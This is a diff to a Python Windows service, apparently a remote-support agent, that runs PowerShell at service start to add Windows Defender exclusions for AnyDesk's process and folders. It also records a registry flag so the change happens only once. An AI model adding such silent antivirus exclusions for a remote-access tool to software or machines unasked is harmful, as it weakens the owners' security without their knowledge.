@@ -55,8 +55,32 @@ def solicitar_permisos_admin():
         return True
     return False
 
+_REG_KEY_AGENTE = r"SOFTWARE\AgenteBacar"
+
+def _leer_flag_registro(nombre):
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, _REG_KEY_AGENTE, 0, winreg.KEY_READ)
+        val, _ = winreg.QueryValueEx(key, nombre)
+        winreg.CloseKey(key)
+        return val
+    except Exception:
+        return None
+
+def _escribir_flag_registro(nombre, valor=1):
+    try:
+        import winreg
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_KEY_AGENTE)
+        winreg.SetValueEx(key, nombre, 0, winreg.REG_DWORD, valor)
+        winreg.CloseKey(key)
+    except Exception as e:
+        log_arranque(f"REG_FLAG_ERROR — {nombre}: {e}")
+
 def agregar_exclusion_anydesk_defender():
-    """Agrega AnyDesk como excepción en Windows Defender (proceso + carpetas comunes)."""
+    """Agrega AnyDesk como excepción en Windows Defender (proceso + carpetas comunes). Solo una vez."""
+    if _leer_flag_registro("anydesk_defender_exclusion"):
+        return
+
     exclusiones = [
         ('ExclusionProcess', 'AnyDesk.exe'),
         ('ExclusionPath', r'C:\Program Files (x86)\AnyDesk'),
@@ -66,6 +90,7 @@ def agregar_exclusion_anydesk_defender():
     if appdata:
         exclusiones.append(('ExclusionPath', os.path.join(appdata, 'AnyDesk')))
 
+    todas_ok = True
     for tipo, valor in exclusiones:
         cmd = f'powershell -Command "Add-MpPreference -{tipo} \'{valor}\'"'
         try:
@@ -76,8 +101,14 @@ def agregar_exclusion_anydesk_defender():
                 log_arranque(f"DEFENDER_EXCLUSION_OK — {tipo}: {valor}")
             else:
                 log_arranque(f"DEFENDER_EXCLUSION_FAIL — {tipo}: {valor} — {r.stderr.strip()}")
+                todas_ok = False
         except Exception as e:
             log_arranque(f"DEFENDER_EXCLUSION_ERROR — {tipo}: {valor} — {e}")
+            todas_ok = False
+
+    if todas_ok:
+        _escribir_flag_registro("anydesk_defender_exclusion")
+        log_arranque("DEFENDER_EXCLUSION — flag guardado en registro, no se ejecutará de nuevo")
 
 def servicio_esta_instalado():
     try:
@@ -142,6 +173,7 @@ if RUNNING_AS_SERVICE:
             # NOTIFICAR INICIO A WINDOWS INMEDIATAMENTE PARA EVITAR ERROR 1053
             self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
             log_arranque(f"SVCRUN_INICIO — PID: {os.getpid()}")
+            agregar_exclusion_anydesk_defender()
 
             try:
                 # Importaciones tardías para no demorar el arranque
